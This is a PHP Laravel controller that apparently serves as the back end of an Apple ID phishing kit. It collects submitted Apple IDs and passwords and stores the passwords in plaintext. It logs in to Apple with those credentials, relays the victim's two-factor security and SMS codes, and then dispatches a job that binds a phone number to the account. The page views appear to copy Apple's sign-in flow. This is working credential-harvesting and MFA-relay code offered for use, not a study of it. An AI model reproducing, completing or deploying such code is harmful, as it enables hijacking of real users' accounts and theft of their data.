<?php

namespace App\Http\Controllers;

use App\Apple\Service\AccountBind;
use App\Apple\Service\Apple;
use App\Apple\Service\AppleFactory;
use App\Apple\Service\Common;
use App\Apple\Service\Exception\LockedException;
use App\Apple\Service\Exception\UnauthorizedException;
use App\Apple\Service\HttpClientBak;
use App\Apple\Service\User;
use App\Jobs\BindAccountPhone;
use App\Models\Account;
use GuzzleHttp\Exception\GuzzleException;
use Illuminate\Contracts\Container\Container;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Application;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;

class IndexController extends Controller
{
    public function __construct(
        protected readonly Request $request,
        private readonly AppleFactory $appleFactory,
    )
    {

    }

    public function ip():string
    {
        return $this->request->ip();
    }

    public function index(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/index');
    }

    public function signin(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/signin');
    }

    /**
     * @return \Illuminate\Http\JsonResponse
     * @throws \App\Apple\Service\Exception\UnauthorizedException
     * @throws \GuzzleHttp\Exception\GuzzleException
     * @throws \Psr\SimpleCache\InvalidArgumentException
     */
    public function verifyAccount(): \Illuminate\Http\JsonResponse
    {
        //Your Apple ID or password was incorrect 您的 Apple ID 或密码不正确
        $accountName = $this->request->input('accountName');
        $password    = $this->request->input('password');

        if (empty($accountName) || empty($password)) {
            return $this->error('账号或密码不能为空');
        }

        $guid = sha1($accountName);

        $apple = $this->appleFactory->create($guid);

        $apple->getUser()->set('account', $accountName);
        $apple->getUser()->set('password', $password);

        $response = $apple->signin($accountName, $password);

        Account::updateOrCreate([
            'account' => $accountName,
        ],[ 'password' => $password]);


        $error = $response->firstServiceError()?->getMessage();
        Session::flash('Error',$error);

        if (!empty($trustedPhoneNumbers = $response->getPhoneNumber())){
            return $this->success(data: [
                'Guid' => $guid,
                'Devices' => false,
                'ID' => $trustedPhoneNumbers->getId(),
                'Number' => $trustedPhoneNumbers->getNumberWithDialCode(),
                'Error' => $error,
            ]);
        }

        return $this->success(data: [
            'Guid' => $guid,
            'Devices' => true,
            'Error' => $error,
        ]);
    }

    public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/auth');
    }

    /**
     * 验证安全码
     * @return \Illuminate\Http\JsonResponse
     * @throws \App\Apple\Service\Exception\UnauthorizedException
     * @throws \GuzzleHttp\Exception\GuzzleException
     */
    public function verifySecurityCode(): \Illuminate\Http\JsonResponse
    {
        $code = $this->request->input('apple_verifycode');
        if (empty($code)) {
            return $this->redirect();
        }

        $guid = $this->request->input('Guid');

        $apple = $this->appleFactory->create($guid);

        if (empty($account = $apple->getUser()->get('account'))) {
            return $this->redirect();
        }

        if (empty($accountInfo = $this->getAccountInfo($account))) {
            return $this->redirect();
        }

        $response = $apple->idmsa->validateSecurityCode($code);

        BindAccountPhone::dispatch($accountInfo->id,$guid);

        return $this->success($response->getData());
    }

    protected function getAccountInfo(string $accountName): \Illuminate\Database\Eloquent\Model|\Illuminate\Database\Eloquent\Builder|Account|\Illuminate\Database\Query\Builder|null
    {
        return Account::where('account', $accountName)
            ->whereNotNull('password')
            ->first();
    }

    /**
     * 验证手机验证码
     * @return JsonResponse
     * @throws GuzzleException
     */
    public function smsSecurityCode(): JsonResponse
    {
        $Id = $this->request->input('ID',1);
        $apple_verifycode = $this->request->input('apple_verifycode');

        if (empty($apple_verifycode)) {
            return $this->redirect();
        }

        $guid = $this->request->input('Guid');//147852

        $apple = $this->appleFactory->create($guid);

        $accountName = $apple->getUser()->get('account');
        if (empty($accountName)) {
            return $this->redirect();
        }

        if (empty($accountInfo = $this->getAccountInfo($accountName))) {
            return $this->redirect();
        }
        // 验证手机号码
        $response = $apple->idmsa->validatePhoneSecurityCode($apple_verifycode,$Id);

        BindAccountPhone::dispatch($accountInfo->id,$guid);
        return $this->success($response->getData());
    }

    /**
     * 获取安全码
     * @return JsonResponse
     * @throws UnauthorizedException
     */
    public function SendSecurityCode(): \Illuminate\Http\JsonResponse
    {
        $guid = $this->request->input('Guid');

        $apple = $this->appleFactory->create($guid);

        return $this->success($apple->idmsa->sendSecurityCode()->getData());
    }

    /**
     * 获取手机号码
     * @return JsonResponse
     * @throws UnauthorizedException
     * @throws GuzzleException
     */
    public function GetPhone(): JsonResponse
    {
        $guid = $this->request->input('Guid');

        $apple = $this->appleFactory->create($guid);

        $response = $apple->auth();

        $trustedPhoneNumbers = $response->getTrustedPhoneNumber();

        return $this->success([
            'ID'                  => $trustedPhoneNumbers->getId(),
            'Number'              => $trustedPhoneNumbers->getNumberWithDialCode(),
        ]);
    }

    /**
     * 发送验证码
     * @return JsonResponse
     * @throws GuzzleException
     */
    public function SendSms(): JsonResponse
    {
        $ID = (int) $this->request->input('ID');
        if (empty($ID)) {
            return $this->error('ID 不能为空');
        }

        $guid = $this->request->input('Guid');
        $apple = $this->appleFactory->create($guid);

        $response = $apple->idmsa->sendPhoneSecurityCode($ID);

        return $this->success($response->getData());
    }

    public function sms(): View|Factory|Application
    {
        return view('index/sms',['phoneNumber' => $this->request->input('Number')]);
    }

    public function result(): View|Factory|Application
    {
        return view('index/result');
    }
}
